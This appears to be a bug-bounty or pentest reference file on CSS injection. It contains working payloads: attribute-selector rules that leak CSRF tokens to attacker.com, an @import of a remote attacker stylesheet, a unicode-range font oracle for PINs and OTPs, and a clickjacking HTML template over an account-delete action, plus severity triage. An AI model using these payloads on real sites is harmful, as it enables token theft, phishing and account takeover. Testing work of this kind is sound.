---
name: css-injection
description: CSS injection attacks that exfiltrate data and hijack clicks without executing JavaScript — attribute-selector token exfiltration, @import attacker-controlled stylesheets, unicode-range font oracles, and opacity-overlay clickjacking. Survives strict CSP because CSP targets script execution, not stylesheet rules.
---

# CSS Injection

CSS can exfiltrate data and hijack clicks **without executing any JavaScript**. Because CSP restricts script execution — not stylesheet rules — CSS injection frequently survives on sites with a strict CSP, making it a high-value residual attack surface after XSS is blocked. Two primitives combine: (1) attribute selectors match DOM nodes by their content, and (2) properties like `background: url()`, `@import`, and `@font-face src` fire HTTP requests when the rule matches.

---

## Where It Appears

| Context | Example targets |
|---|---|
| User-customizable CSS / themes | Custom-CSS profile pages, Slack/Notion-style themes, phpBB/forum themes |
| HTML email rendering | Gmail/Outlook/Mailchimp renderers (real CVEs across all three) |
| Forum / CMS rich text | WordPress posts, Confluence custom CSS, MediaWiki user CSS |
| HTML-to-PDF pipelines | Headless Chrome rendering invoices/reports — **CSS runs server-side** |
| SSTI side-effect | User input rendered into a `<style>` block or a `style=` attribute |
| Markdown engines | Some allow `<style>` / `style=` by default |

If a sanitizer strips `<script>` but leaves `style=`, `<style>`, `url()`, or `@import`, this class is live.

---

## Primitive 1: Attribute-Selector Exfiltration (steal tokens char-by-char)

Steal a CSRF token / API key / reset token one character at a time. No JavaScript, survives strict CSP.

```css
/* Round 1 — leak the first character of the token */
input[name="csrf"][value^="a"] { background: url(//attacker.com/?c=a) }
input[name="csrf"][value^="b"] { background: url(//attacker.com/?c=b) }
input[name="csrf"][value^="c"] { background: url(//attacker.com/?c=c) }
/* ...62 rules covering [a-zA-Z0-9]... */
```

**Mechanics:**
1. Victim loads a page containing `<input name="csrf" value="abc123...">`.
2. The browser evaluates all 62 rules — only one matches (`value^="a"`).
3. The match fires `background: url(...)` → `GET //attacker.com/?c=a`.
4. Attacker's log reveals: first char = `a`.
5. Round 2 rewrites the CSS with `value^="aa"`, `value^="ab"`, … to leak the next char.
6. Token of length N extracted in N rounds (or single-pass on modern Chrome via `:has()` + sibling-selector tricks).

Selector variants: `[value^="X"]` (prefix), `[value$="X"]` (suffix — good for keystroke-style logging), `[value*="X"]` (substring).

---

## Primitive 2: `@import` — Attacker-Controlled Stylesheet

If the sanitizer strips scripts but allows `@import` or `url()`, pull in an arbitrary remote stylesheet and control **all** page styling:

```css
@import url(https://attacker.com/evil.css);
```

Now the attacker can overlay phishing forms, hide warning banners, and reposition/relabel cancel/confirm buttons. Combine with attribute-selector exfil hosted in the remote sheet for a self-updating multi-round leak.

---

## Primitive 3: Font-Based Character Oracle

Use `unicode-range` on an `@font-face` to fire a request only when a specific character is rendered on the page — a per-character presence oracle (leak short data such as PINs/OTP digits visible in the DOM):

```css
@font-face { font-family: x; src: url(//attacker.com/?d=5); unicode-range: U+0035; } /* fires only if "5" is rendered */
```

---

## Primitive 4: Opacity-Overlay Clickjacking (the "chain" PoC)

The conditionally-valid rule requires clickjacking + a sensitive action + a working PoC. Template:

```html
<!-- Hosted on attacker.com -->
<button style="position:absolute;top:50px;left:50px;z-index:1;">Click to win iPhone!</button>
<iframe src="https://target.com/account/delete?confirm=1"
        style="position:absolute;top:50px;left:50px;width:200px;height:50px;opacity:0;z-index:9999;"></iframe>
```

The transparent iframe sits over the visible bait button. The victim clicks "win iPhone" but actually clicks the delete-account confirm control under their logged-in session. Adjust `top/left/width/height` to overlay the exact sensitive control (transfer, change-email submit, OAuth "Approve").

**PoC verification checklist:**
- [ ] `X-Frame-Options` unset OR `ALLOWALL`
- [ ] CSP `frame-ancestors` unset OR includes wildcard/attacker domain
- [ ] Target action needs only a click (no second confirmation)
- [ ] Session cookies are `SameSite=None` or omitted → cross-site iframe stays authenticated

---

## Chains That Pay

```
Attribute selector + CSRF-token form   -> token exfil -> CSRF on sensitive action   High
Attribute selector + rendered password -> partial credential exfil                  High
@import + phishing-form overlay         -> credential theft                         High
Opacity overlay + transfer/delete/email-change -> account compromise                Medium/High
Font oracle + short rendered data (PIN/OTP)     -> character oracle                 Low-Medium (chain)
CSS injection with no exfil/overlay path        -> N/A standalone
```

## Triage / False-Positive Gate

```
Attribute selector exfils real sensitive data (token/password/SSN)   = High
@import or full stylesheet control + working phishing PoC             = High
Opacity overlay that completes a sensitive action in the PoC          = Medium/High
Only cosmetic CSS allowed (no url()/@import) + no exfil path          = N/A
url() blocked but positioning/transforms allowed                      = Info (clickjacking-only chain)
HTML-email CSS rendering with rendered attacker styles                = Medium (case-by-case)
```
Standalone CSS injection with no exfil channel and no overlay over a sensitive action is **N/A** — you must demonstrate token theft or a completed sensitive action.
